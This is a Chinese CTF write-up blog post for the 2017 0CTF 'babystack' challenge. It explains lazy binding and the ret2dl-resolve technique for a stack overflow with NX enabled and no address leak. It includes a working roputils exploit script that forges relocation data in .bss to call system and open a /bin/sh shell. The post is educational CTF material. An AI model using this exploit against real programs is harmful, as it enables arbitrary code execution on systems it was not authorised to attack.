---
title: 2017 0ctf babystack
date: 2018-7-27 08:37:40
tags: [CTF, PWN]
categories: PWN练习
---
# babystack WP

​	拿到题目扔ida一看发现是一道栈溢出，但开启了nx保护，而程序没有能泄露地址的函数，所以无法利用rop，想了很久。后来查了才知道这题要用return2dl-resolve来做。

<!--more-->

​	return2dl-resolve可以用来绕过aslr和nx，但是由于这种利用相对比较高级，利用起来比较难理解，所以一般情况下是不用这种利用的，比如如果是栈溢出但是题目给了你libc或者有leak函数给你的话，你就可以用rop，没有必要使用ret2dl-resolve，但是如果题目没有给你libc，而且程序中不能leak的话，碰到这种死局一般就要想到要用到ret2dl-resolve。这里说到ret2dl-resolve就不能不介绍一下linux下对可执行程序使用的延迟绑定技术了。
	一个动态链接的程序，如果在链接的时候将所有函数都进行解析，那么链接过程花费的时间肯定就长，针对这个缺点，动态链接器只对程序中调用到的libc库函数进行解析定位，那些没有用到的就不用去解析，这样就能提高链接效率，提高程序启动速度了。
	一个elf可执行程序，当调用一个函数的时候会根据对应函数got表中的地址调用相应的函数。比如调用plt表中的函数首先会取出对应函数got表中的值，然后做一个跳转，但如果是第一次调用该函数，那么got表中的值是指向plt第二句的，plt的第二句会压入一个偏移，表示该函数在got表中的表项。之后程序会跳到got表起始地址+8处，这里保存着解析函数dl_runtime_resolve，前面会把link_map以及reloc_arg压栈，这样就相当于是执行了_dl_runtime_resolve(link_map,reloc_arg)，这个函数会根据link_map地址和偏移将libc真实地址写入到对应函数got表中。之后调用函数的话就可以直接调用got中保存的地址，不需要plt再去查找并绑定了。

利用方式：
控制EIP为PLT[0]的地址，只需传递一个index_arg参数
控制index_arg的大小，使reloc的位置落在可控地址内
伪造reloc的内容，使sym落在可控地址内
伪造sym的内容，使name落在可控地址内
伪造name为任意库函数，如system 因为它查找是通过辨识函数字符串的

利用可以说是很复杂了，但是格式基本差不多，github上找到利用脚本，需要roputils扩展。
利用脚本：

```
from roputils import *

fpath = sys.argv[1]

offset = int(sys.argv[2])

rop = ROP(fpath)

addr_bss = rop.section('.bss')

buf = rop.retfill(offset)

buf += rop.call('read', 0, addr_bss, 100)

buf += rop.dl_resolve_call(addr_bss+20, addr_bss)

p = Proc(rop.fpath)

p.write(p32(len(buf)) + buf)

print "[+] read: %r" % p.read(len(buf))

buf = rop.string('/bin/sh')

buf += rop.fill(20, buf)

buf += rop.dl_resolve_data(addr_bss+20, 'system')

buf += rop.fill(100, buf)

p.write(buf)

p.interact(0)


```



这里贴上觉得不错的资料：

```
https://blog.csdn.net/weixin_40850881/article/details/80211762

http://www.cnblogs.com/Ox9A82/p/5487275.html

https://zhuanlan.zhihu.com/p/23255727

```

